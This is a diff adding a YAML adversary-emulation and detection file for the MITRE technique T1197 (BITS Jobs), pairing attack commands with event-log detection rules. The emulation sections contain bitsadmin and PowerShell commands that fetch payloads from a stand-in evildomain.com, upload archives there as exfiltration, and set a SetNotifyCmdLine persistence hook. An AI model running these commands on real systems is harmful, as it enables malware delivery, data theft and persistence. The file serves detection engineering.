@@ -1,1 +1,176 @@
-TBD
+tactics:
+  - TA0003 - Persistence
+  - TA0005 - Defense Evasion
+techniques:
+  - T1197 - BITS Jobs
+description: >
+  Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, 
+  asynchronous file transfer mechanism exposed through Component Object Model (COM).
+links:
+  - https://attack.mitre.org/techniques/T1197/
+  - https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal
+  - https://blog.menasec.net/2021/05/hunting-for-suspicious-usage-of.html
+procedures:
+  procedure T1197.001:
+    description: >
+      - adversary may download malicious files on the target system using standard Bitsadmin utility or Powershell cmdlets.
+    emulation:
+      tools:
+        - bitsadmin.exe
+      cmd: >
+        - bitsadmin /transfer myJob https://evildomain.com/payload.exe c:\Windows\Temp\payload.exe
+        - bitsadmin /create myJob & bitsadmin /addfile myJob https://evildomain.com/payload.exe c:\Windows\Temp\payload.exe & bitsadmin /resume myJob & bitsadmin /complete myJob
+      powershell: >
+        - Start-BitsTransfer -Source "https://evildomain.com/payload.exe" -Destination "c:\Windows\Temp\payload.exe"
+        - Get-BitsTransfer -JobId myJob | Add-BitsFile -Source "https://evildomain.com/payload.exe" -Destination "c:\Windows\Temp\payload.exe"
+        - powershell -c "Start-BitsTransfer -Source 'https://live.sysinternals.com/autoruns.exe' -Destination 'c:\hunting\research\bits\autoruns.exe'"
+        - pwsh -c "Start-BitsTransfer -Source 'https://evildomain.com/payload.exe' -Destination 'c:\Windows\Temp\payload.exe'"
+        - $Bits = Start-BitsTransfer -DisplayName "MyJob" -Suspended | Add-BitsTransfer -BitsJob $Bits -ClientFileName C:\myFile -ServerFileName http://www.mysite.com/file1 | Resume-BitsTransfer -BitsJob $Bits -Asynchronous
+    detection:
+      ideas: >
+        - monitor execution of Bitsadmin utility and specific Powershell cmdlets.
+      telemetry:
+        process_create:
+          - Windows EID 4688
+          - Sysmon EID 1
+          - EDR (PsSetCreateProcessNotifyRoutine/Ex)
+        script_execution:
+          - Windows-Powershell EID 400
+      rules: >
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:"\\bitsadmin.exe" OR ProcessCommandLine:"*bitsadmin *") AND NOT ProcessCommandLine:*upload*
+        - Channel:Sysmon AND EventID:1 AND (Image:"\\bitsadmin.exe" OR CommandLine:"*bitsadmin *" OR OriginalFileName:"bitsadmin.exe" OR Description:"BITS administration utility") AND NOT CommandLine:*upload*
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:("\\powershell.exe" OR "\\pwsh.exe") OR ProcessCommandLine:("*powershell *" OR "*pwsh *"))  
+          AND ProcessCommandLine:("*Add-BitsFile*" OR "*Start-BitsTransfer*" OR "*Resume-BitsTransfer*") AND NOT ProcessCommandLine:*upload*
+        - Channel:Sysmon AND EventID:1 AND (Image:("\\powershell.exe" OR "\\pwsh.exe") OR CommandLine:("*powershell *" OR "*pwsh *") OR OriginalFileName:"PowerShell.EXE" 
+          OR Description:"Windows PowerShell") AND CommandLine:("*Add-BitsFile*" OR "*Start-BitsTransfer*" OR "*Resume-BitsTransfer*") AND NOT CommandLine:*upload*
+        - Channel:Windows-Powershell AND EventID:400 AND HostApplication:("*powershell *" OR "*pwsh *") AND HostApplication:("*Add-BitsFile*" OR "*Start-BitsTransfer*" OR "*Resume-BitsTransfer*") 
+          AND NOT HostApplication:*upload*
+      ideas: >
+        - monitor suspicious executable/scripts files creation by BITS server process using files extensions and magic bytes.
+      notes: >
+        - add more suspicious files extensions and magic bytes at will.
+      telemetry:
+        file_rename:
+          - EDR (minifilter)
+      rules:
+        - Channel:EDR AND EventType:FileRename AND (NewTargetFilename:(*.exe OR *.dll OR *.ps1 OR *.bat OR *.vbs OR *.ocx OR *.rar OR *.zip)
+          OR NewFileMagicBytes:"4D5A*") AND OldTargetFilename.keyword:/BIT.*\.tmp/ AND Image:"\\svchost.exe" AND ImageCommandLine:*netsvcs*
+      ideas: >
+        - monitor BITS jobs creation by suspicious processes.
+      notes: >
+        - add more suspicious LOLBins and other processes at will.
+      telemetry:
+        bits_job_created:
+          - Microsoft-Windows-Bits-Client EID 3
+      rules: >
+        - Channel:Microsoft-Windows-Bits-Client AND ProcessPath:("\\bitsadmin.exe" OR "\\pwsh.exe" OR "\\powershell.exe" OR "\\rundll32.exe" OR "\\certutil.exe" 
+          OR "\\cmstp.exe" OR "\\msbuild.exe")
+  procedure T1197.002:
+    description:
+      - adversary may deliver payloads in the target environment using Bitsadmin utility/Powershell cmdlets and Windows admin shares.
+    emulation:
+      tools:
+        - bitsadmin.exe
+      cmd: >
+        - bitsadmin /transfer debjob /download /priority high \\DC01-cybercorp\c$\windows\evil.exe C:\Windows\evil.exe
+        - bitsadmin /transfer \\DC01-cybercorp\admin$\windows\evil.exe C:\Windows\evil.exe
+      powershell: >
+        - Start-BitsTransfer -Source "\\DC01-cybercorp\c$\windows\evil.exe" -Destination "C:\Windows\evil.exe"
+        - Start-BitsTransfer -Source "\\DC01-cybercorp\admin$\windows\evil.exe" -Destination "C:\Windows\evil.exe"
+        - powershell -c "Start-BitsTransfer -Source '\\DC01-cybercorp\c$\windows\evil.exe' -Destination 'C:\Windows\evil.exe'"
+        - pwsh -c "Start-BitsTransfer -Source '\\DC01-cybercorp\admin$\windows\evil.exe' -Destination 'C:\Windows\evil.exe'"
+    detection:
+      ideas: >
+        - monitor execution of Bitsadmin utility and specific Powershell cmdlets with Windows Admin shares paths in command-line.
+      telemetry:
+        process_create:
+          - Windows EID 4688
+          - Sysmon EID 1
+          - EDR (PsSetCreateProcessNotifyRoutine/Ex)
+        script_execution:
+          - Windows-Powershell EID 400
+      rules: >
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:"\\bitsadmin.exe" OR ProcessCommandLine:"*bitsadmin *") AND NOT ProcessCommandLine.keyword:/.*\\\\.*\\(ADMIN|C)\$.*/
+        - Channel:Sysmon AND EventID:1 AND (Image:"\\bitsadmin.exe" OR CommandLine:"*bitsadmin *" OR OriginalFileName:"bitsadmin.exe" OR Description:"BITS administration utility") AND CommandLine.keyword:/.*\\\\.*\\(ADMIN|C)\$.*/
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:("\\powershell.exe" OR "\\pwsh.exe") OR ProcessCommandLine:("*powershell *" OR "*pwsh *"))  
+          AND ProcessCommandLine:("*Add-BitsFile*" OR "*Start-BitsTransfer*" OR "*Resume-BitsTransfer*") AND ProcessCommandLine.keyword:/.*\\\\.*\\(ADMIN|C)\$.*/
+        - Channel:Sysmon AND EventID:1 AND (Image:("\\powershell.exe" OR "\\pwsh.exe") OR CommandLine:("*powershell *" OR "*pwsh *") OR OriginalFileName:"PowerShell.EXE" 
+          OR Description:"Windows PowerShell") AND CommandLine:("*Add-BitsFile*" OR "*Start-BitsTransfer*" OR "*Resume-BitsTransfer*") AND CommandLine.keyword:/.*\\\\.*\\(ADMIN|C)\$.*/
+        - Channel:Windows-Powershell AND EventID:400 AND HostApplication:("*powershell *" OR "*pwsh *") AND HostApplication:("*Add-BitsFile*" OR "*Start-BitsTransfer*" OR "*Resume-BitsTransfer*") 
+          AND HostApplication.keyword:/.*\\\\.*\\(ADMIN|C)\$.*/
+  procedure T1197.003:
+    description: >
+      - adversary may exfiltrate files/data from compromised system on a remote server using standard Bitsadmin utility or Powershell cmdlets.
+    emulation:
+      tools:
+        - bitsadmin.exe
+      cmd: >
+        - bitsadmin /transfer myJob /upload c:\Windows\Temp\data.zip https://remotedomain.com/data.zip
+        - bitsadmin /create myJob /upload-reply & bitsadmin /addfile myJob c:\Windows\Temp\data.zip https://remotedmain.com/data.zip & bitsadmin /resume myJob & bitsadmin /complete myJob
+      powershell: >
+        - Start-BitsTransfer -Source "c:\Windows\Temp\data.rar" -Destination "https://evildomain.com/data.rar" -TransferType Upload
+        - Get-BitsTransfer -JobId myJob | Add-BitsFile -Source "c:\Windows\Temp\data.rar" -Destination "https://evildomain.com/data.rar" | Start-BitsTransfer -TransferType Upload        
+        - powershell -c "Start-BitsTransfer -Source 'c:\Windows\Temp\data.rar' -Destination 'https://evildomain.com/data.rar' -TransferType Upload"
+        - pwsh -c "Start-BitsTransfer -Source -Source 'c:\Windows\Temp\data.rar' -Destination 'https://evildomain.com/data.rar' -TransferType Upload"
+        - $Bits = Start-BitsTransfer -DisplayName "MyJob" -Suspended | Add-BitsTransfer -BitsJob $Bits -ClientFileName C:\myFile -ServerFileName http://www.mysite.com/file1 | Resume-BitsTransfer -BitsJob $Bits -TransferType Upload
+    detection:
+      ideas: >
+        - monitor execution of Bitsadmin utility and specific Powershell cmdlets with "upload" option.
+      notes: >
+        - consider adding various archive files extensions to command-line condition to "narrow down" detection rules and reduce possible FPs.
+      telemetry:
+        process_create:
+          - Windows EID 4688
+          - Sysmon EID 1
+          - EDR (PsSetCreateProcessNotifyRoutine/Ex)
+        script_execution:
+          - Windows-Powershell EID 400
+      rules: >
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:"\\bitsadmin.exe" OR ProcessCommandLine:"*bitsadmin *") AND ProcessCommandLine:*upload*
+        - Channel:Sysmon AND EventID:1 AND (Image:"\\bitsadmin.exe" OR CommandLine:"*bitsadmin *" OR OriginalFileName:"bitsadmin.exe" OR Description:"BITS administration utility") AND CommandLine:*upload*
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:("\\powershell.exe" OR "\\pwsh.exe") OR ProcessCommandLine:("*powershell *" OR "*pwsh *"))  
+          AND ProcessCommandLine:("*Add-BitsFile*" OR "*Start-BitsTransfer*" OR "*Resume-BitsTransfer*") AND ProcessCommandLine:*upload*
+        - Channel:Sysmon AND EventID:1 AND (Image:("\\powershell.exe" OR "\\pwsh.exe") OR CommandLine:("*powershell *" OR "*pwsh *") OR OriginalFileName:"PowerShell.EXE" 
+          OR Description:"Windows PowerShell") AND CommandLine:("*Add-BitsFile*" OR "*Start-BitsTransfer*" OR "*Resume-BitsTransfer*") AND CommandLine:*upload*
+        - Channel:Windows-Powershell AND EventID:400 AND HostApplication:("*powershell *" OR "*pwsh *") AND HostApplication:("*Add-BitsFile*" OR "*Start-BitsTransfer*" OR "*Resume-BitsTransfer*") 
+          AND HostApplication:*upload*
+  procudure T1197.004:
+    description:
+      - adversary may establish persistence using bitsadmin "setnotifycmdline" option for BITS job.
+    emulation:
+      tools:
+        - bitsadmin.exe
+      cmd:
+        - bitsadmin /create 1 & bitsadmin /addfile 1 http://evildomain.com/payload.exe c:\windows\temp\payload.exe & bitsadmin /SetNotifyCmdLine 1 c:\windows\temp\payload.exe NULL & bitsadmin /resume 1
+        - bitsadmin /setnotifycmdline myDownloadJob c:\windows\temp\payload.exe NULL
+    detection:
+      ideas: >
+        - monitor execution of Bitsadmin utility with "setnotifycmdline" option.
+        - monitor untypical process creation with svchost.exe parent process and "-s BITS" command-line (rule 2), filter out legitimate cases.
+      notes: >
+        - for the 2nd idea take into account that in most cases you will have "svchost.exe -k netsvcs -p" parent, without "-s BITS" parameter in command-line.
+      telemetry:
+        process_create:
+          - Windows EID 4688
+          - Sysmon EID 1
+          - EDR (PsSetCreateProcessNotifyRoutine/Ex)
+      rules: >
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:"\\bitsadmin.exe" OR ProcessCommandLine:"*bitsadmin *") AND ProcessCommandLine:*setnotifycmdline*
+        - Channel:Sysmon AND EventID:1 AND (Image:"\\bitsadmin.exe" OR CommandLine:"*bitsadmin *" OR OriginalFileName:"bitsadmin.exe" OR Description:"BITS administration utility") AND CommandLine:*setnotifycmdline*
+        - Channel:Sysmon AND EventID:1 AND ParentImage:"\\Windows\\System32\\svchost.exe" AND ParentCommandLine:*BITS*
+  procudure T1197.005:
+    description:
+      - adversary may craft his own binary and use BITS DLLs functionality directly, avoiding bitsadmin/powershell related detections.
+    detection:
+      ideas: >
+        - monitor BITS DLLs loaded by untypical host processes.
+      notes: >
+        - profile your environment and add more legitimate host processes for BITS DLLs.
+      telemetry:
+        image_load:
+          - Sysmon EID 7
+          - EDR (PsSetLoadImageNotifyRoutine)
+      rules: >
+        - Channel:Sysmon AND EventID:7 AND ImageLoaded:("\\bitsproxy.dll" OR "qmgrprxy.dll" OR "\\Microsoft.BackgroundIntelligentTransfer.Management.Interop.dll") 
+          AND NOT Image:("\\Windows\\System32\\bitsadmin.exe" OR "\\System32\\svchost.exe" OR "\\WindowsPowerShell\\v1.0\\powershell.exe" OR "\\Speech_OneCore\\common\\SpeechModelDownload.exe" OR "\\DeviceEnroller.exe" 
+          OR "\\ofdeploy.exe" OR "\\OneDrive\\OneDrive.exe" OR "\\Google\\Chrome\\Application\\chrome.exe" OR "\\OneDrive\\OneDriveStandaloneUpdater.exe")
